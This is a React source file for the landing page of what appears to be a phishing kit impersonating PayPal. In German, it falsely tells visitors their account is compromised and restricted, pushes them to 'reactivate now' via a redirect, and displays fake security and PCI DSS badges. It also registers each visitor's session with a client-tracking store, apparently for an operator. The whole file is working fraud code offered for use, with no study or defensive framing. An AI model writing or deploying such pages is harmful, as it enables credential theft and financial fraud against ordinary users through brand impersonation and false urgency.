import React from 'react';
import { ShieldAlert, ArrowRight, Lock } from 'lucide-react';
import { motion } from 'motion/react';
import { useNavigate } from 'react-router-dom';

import { ClientStore } from '../services/ClientStore';

export default function Home() {
  const navigate = useNavigate();

  React.useEffect(() => {
    let clientId = sessionStorage.getItem('clientId');
    if (!clientId) {
      clientId = 'cli-' + Math.random().toString(36).substr(2, 9);
      sessionStorage.setItem('clientId', clientId);
    }
    ClientStore.addOrUpdateClient({ id: clientId, status: 'CONNECTED' });
  }, []);

  return (
    <div className="w-full max-w-xl mx-auto px-4 md:px-6 py-8 md:py-12">
      <motion.div 
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        transition={{ duration: 0.4, ease: "easeOut" }}
        className="bg-white rounded-2xl border border-app-border shadow-2xl p-6 md:p-12 text-center"
      >
        {/* Urgent Icon */}
        <div className="flex justify-center mb-6 md:mb-8">
          <motion.div 
            animate={{
              scale: [1, 1.15, 1],
              opacity: [1, 0.8, 1]
            }}
            transition={{
              duration: 2,
              repeat: Infinity,
              ease: "easeInOut"
            }}
            className="bg-red-50 p-3 md:p-4 rounded-full shadow-lg shadow-red-100"
          >
            <ShieldAlert className="w-10 h-10 md:w-12 md:h-12 text-red-600" />
          </motion.div>
        </div>

        {/* Emergency Content */}
        <h1 className="text-xl md:text-3xl font-bold text-text-main mb-3 md:mb-4 tracking-tight leading-tight">
          Sicherheitswarnung: <br/> 
          <span className="text-red-600">Ihr Konto wurde kompromittiert</span>
        </h1>
        
        <p className="text-text-muted text-sm md:text-[15px] leading-relaxed mb-8 md:mb-10">
          Wir haben unbefugte Aktivitäten in Ihrem PayPal-Konto festgestellt. Um weiteren Missbrauch zu verhindern, haben wir den Zugriff vorübergehend eingeschränkt. 
          <br /><br className="hidden md:block" />
          Sie müssen Ihr Konto <strong className="text-text-main">umgehend reaktivieren</strong>, um wieder vollen Zugriff auf Ihr Guthaben zu erhalten.
        </p>

        {/* CTA */}
        <div className="space-y-4">
          <button 
            onClick={() => navigate('/redirect')}
            className="w-full bg-primary text-white font-bold py-3.5 md:py-4 px-6 rounded-xl transition-all flex items-center justify-center gap-3 shadow-lg shadow-primary/20 active:scale-[0.98]"
          >
            Jetzt reaktivieren
            <ArrowRight className="w-5 h-5 transition-transform" />
          </button>
          
          <div className="flex items-center justify-center gap-2 text-[11px] md:text-[12px] text-text-muted">
            <Lock className="w-3.5 h-3.5" />
            Verschlüsselte Sicherheitsverbindung
          </div>
        </div>
      </motion.div>

      {/* Trust Badges */}
      <motion.div 
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.5 }}
        className="mt-6 md:mt-8 flex flex-wrap justify-center gap-4 md:gap-8 opacity-40 grayscale"
      >
        <span className="text-[9px] md:text-[10px] font-bold uppercase tracking-widest text-text-muted">Verified by Security Ops</span>
        <span className="text-[9px] md:text-[10px] font-bold uppercase tracking-widest text-text-muted">PCI DSS Compliant</span>
      </motion.div>
    </div>
  );
}
